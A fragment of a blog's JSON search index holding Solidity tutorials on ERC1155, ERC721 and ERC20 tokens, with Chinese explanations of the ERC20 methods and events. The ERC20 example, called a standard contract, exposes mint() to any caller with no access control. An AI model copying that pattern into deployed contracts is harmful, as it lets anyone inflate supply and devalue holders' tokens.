) internal &#123;        require(to != address(0), &quot;to = 0 address&quot;);        require(ids.length == values.length, &quot;ids length != values length&quot;);        for (uint256 i = 0; i &lt; ids.length; i++) &#123;            balanceOf[to][ids[i]] += values[i];        &#125;        emit TransferBatch(msg.sender, address(0), to, ids, values);        if (to.code.length &gt; 0) &#123;            require(                IERC1155TokenReceiver(to).onERC1155BatchReceived(                    msg.sender,                    address(0),                    ids,                    values,                    data                ) == IERC1155TokenReceiver.onERC1155BatchReceived.selector,                &quot;unsafe transfer&quot;            );        &#125;    &#125;    function _burn(address from, uint256 id, uint256 value) internal &#123;        require(from != address(0), &quot;from = 0 address&quot;);        balanceOf[from][id] -= value;        emit TransferSingle(msg.sender, from, address(0), id, value);    &#125;    function _batchBurn(        address from,        uint256[] calldata ids,        uint256[] calldata values    ) internal &#123;        require(from != address(0), &quot;from = 0 address&quot;);        require(ids.length == values.length, &quot;ids length != values length&quot;);        for (uint256 i = 0; i &lt; ids.length; i++) &#123;            balanceOf[from][ids[i]] -= values[i];        &#125;        emit TransferBatch(msg.sender, from, address(0), ids, values);    &#125;&#125;\n","tags":["Ethereum"]},{"title":"ERC721","url":"/2023/03/12/ERC721/","content":"interface IERC165 &#123;    function supportsInterface(bytes4 interfaceID) external view returns (bool);&#125;interface IERC721 is IERC165 &#123;    function balanceOf(address owner) external view returns (uint balance);    function ownerOf(uint tokenId) external view returns (address owner);    function safeTransferFrom(address from, address to, uint tokenId) external;    function safeTransferFrom(        address from,        address to,        uint tokenId,        bytes calldata data    ) external;    function transferFrom(address from, address to, uint tokenId) external;    function approve(address to, uint tokenId) external;    function getApproved(uint tokenId) external view returns (address operator);    function setApprovalForAll(address operator, bool _approved) external;    function isApprovedForAll(        address owner,        address operator    ) external view returns (bool);&#125;interface IERC721Receiver &#123;    function onERC721Received(        address operator,        address from,        uint tokenId,        bytes calldata data    ) external returns (bytes4);&#125;\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8.20;contract ERC721 is IERC721 &#123;    event Transfer(address indexed from, address indexed to, uint indexed id);    event Approval(address indexed owner, address indexed spender, uint indexed id);    event ApprovalForAll(        address indexed owner,        address indexed operator,        bool approved    );    // Mapping from token ID to owner address    mapping(uint =&gt; address) internal _ownerOf;    // Mapping owner address to token count    mapping(address =&gt; uint) internal _balanceOf;    // Mapping from token ID to approved address    mapping(uint =&gt; address) internal _approvals;    // Mapping from owner to operator approvals    mapping(address =&gt; mapping(address =&gt; bool)) public isApprovedForAll;    function supportsInterface(bytes4 interfaceId) external pure returns (bool) &#123;        return            interfaceId == type(IERC721).interfaceId ||            interfaceId == type(IERC165).interfaceId;    &#125;    function ownerOf(uint id) external view returns (address owner) &#123;        owner = _ownerOf[id];        require(owner != address(0), &quot;token doesn&#x27;t exist&quot;);    &#125;    function balanceOf(address owner) external view returns (uint) &#123;        require(owner != address(0), &quot;owner = zero address&quot;);        return _balanceOf[owner];    &#125;    function setApprovalForAll(address operator, bool approved) external &#123;        isApprovedForAll[msg.sender][operator] = approved;        emit ApprovalForAll(msg.sender, operator, approved);    &#125;    function approve(address spender, uint id) external &#123;        address owner = _ownerOf[id];        require(            msg.sender == owner || isApprovedForAll[owner][msg.sender],            &quot;not authorized&quot;        );        _approvals[id] = spender;        emit Approval(owner, spender, id);    &#125;    function getApproved(uint id) external view returns (address) &#123;        require(_ownerOf[id] != address(0), &quot;token doesn&#x27;t exist&quot;);        return _approvals[id];    &#125;    function _isApprovedOrOwner(        address owner,        address spender,        uint id    ) internal view returns (bool) &#123;        return (spender == owner ||            isApprovedForAll[owner][spender] ||            spender == _approvals[id]);    &#125;    function transferFrom(address from, address to, uint id) public &#123;        require(from == _ownerOf[id], &quot;from != owner&quot;);        require(to != address(0), &quot;transfer to zero address&quot;);        require(_isApprovedOrOwner(from, msg.sender, id), &quot;not authorized&quot;);        _balanceOf[from]--;        _balanceOf[to]++;        _ownerOf[id] = to;        delete _approvals[id];        emit Transfer(from, to, id);    &#125;    function safeTransferFrom(address from, address to, uint id) external &#123;        transferFrom(from, to, id);        require(            to.code.length == 0 ||                IERC721Receiver(to).onERC721Received(msg.sender, from, id, &quot;&quot;) ==                IERC721Receiver.onERC721Received.selector,            &quot;unsafe recipient&quot;        );    &#125;    function safeTransferFrom(        address from,        address to,        uint id,        bytes calldata data    ) external &#123;        transferFrom(from, to, id);        require(            to.code.length == 0 ||                IERC721Receiver(to).onERC721Received(msg.sender, from, id, data) ==                IERC721Receiver.onERC721Received.selector,            &quot;unsafe recipient&quot;        );    &#125;    function _mint(address to, uint id) internal &#123;        require(to != address(0), &quot;mint to zero address&quot;);        require(_ownerOf[id] == address(0), &quot;already minted&quot;);        _balanceOf[to]++;        _ownerOf[id] = to;        emit Transfer(address(0), to, id);    &#125;    function _burn(uint id) internal &#123;        address owner = _ownerOf[id];        require(owner != address(0), &quot;not minted&quot;);        _balanceOf[owner] -= 1;        delete _ownerOf[id];        delete _approvals[id];        emit Transfer(owner, address(0), id);    &#125;&#125;\n","tags":["Ethereum"]},{"title":"ERC20","url":"/2023/03/12/ERC20/","content":"ERC20是一种代币标准，它主要提供了两种转账方式：transfer、transferFrom。为以太坊上的代币合约提供了一个标准化的方案，也对以太坊上数字经济的实现进行了一定的规范。\n下面是ERC20的接口：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.20;// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/IERC20.solinterface IERC20 &#123;    function totalSupply() external view returns (uint);    function balanceOf(address account) external view returns (uint);    function transfer(address recipient, uint amount) external returns (bool);    function allowance(address owner, address spender) external view returns (uint);    function approve(address spender, uint amount) external returns (bool);    function transferFrom(        address sender,        address recipient,        uint amount    ) external returns (bool);    event Transfer(address indexed from, address indexed to, uint value);    event Approval(address indexed owner, address indexed spender, uint value);&#125;\n现在我们就一一对各个方法及事件进行介绍：\n\ntotalSupply()  代币发行总量，\nbalanceOf(address account)  对某个账户进行余额查询\ntransfer(address recipient, uint amount)  由交易发起者向另一个账户地址进行转账。\napprove(address spender, uint amount)  设置允许某个账户spender能够从发起者地址中使用的代币数量\nallowance(address owner, address spender)  查询某个地址spender可以从owner中使用的代币数量\ntransferFrom(address sender, address recipient, uint amount)  能够实现非自己账户间的代币交易。\n\n两个事件：\n\nTransfer(address indexed from, address indexed to, uint value)  在每次进行代币交易成功时会触发，描述这笔交易的发起着，接受着以及金额。\nApproval(address indexed owner, address indexed spender, uint value)  在调用approve()函数时触发，描述代币授权的拥有者，接受者以及金额\n\n除了上述的主要方法外，建议在使用ERC20时实现name decimals symbol这三个状态变量。\n他们分别代表这个代币的名称、精度、代币简称。\n下面就是一个标准的ERC20 token合约：\n// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import &quot;./IERC20.sol&quot;;contract ERC20 is IERC20 &#123;    uint public totalSupply;    mapping(address =&gt; uint) public balanceOf;    mapping(address =&gt; mapping(address =&gt; uint)) public allowance;    string public name = &quot;Solidity by Example&quot;;    string public symbol = &quot;SOLBYEX&quot;;    uint8 public decimals = 18;    function transfer(address recipient, uint amount) external returns (bool) &#123;        balanceOf[msg.sender] -= amount;        balanceOf[recipient] += amount;        emit Transfer(msg.sender, recipient, amount);        return true;    &#125;    function approve(address spender, uint amount) external returns (bool) &#123;        allowance[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    &#125;    function transferFrom(        address sender,        address recipient,        uint amount    ) external returns (bool) &#123;        allowance[sender][msg.sender] -= amount;        balanceOf[sender] -= amount;        balanceOf[recipient] += amount;        emit Transfer(sender, recipient, amount);        return true;    &#125;    function mint(uint amount) external &#123;        balanceOf[msg.sender] += amount;        totalSupply += amount;        emit Transfer(address(0), msg.sender, amount);    &#125;    function burn(uint amount) external &#123;        balanceOf[msg.sender] -= amount;        totalSupply -= amount;        emit Transfer(msg.sender, address(0), amount);    &#125;&#125;\n函数mint、burn分别为代币增发、代币销毁的功能。\n","tags":["Ethereum"]}]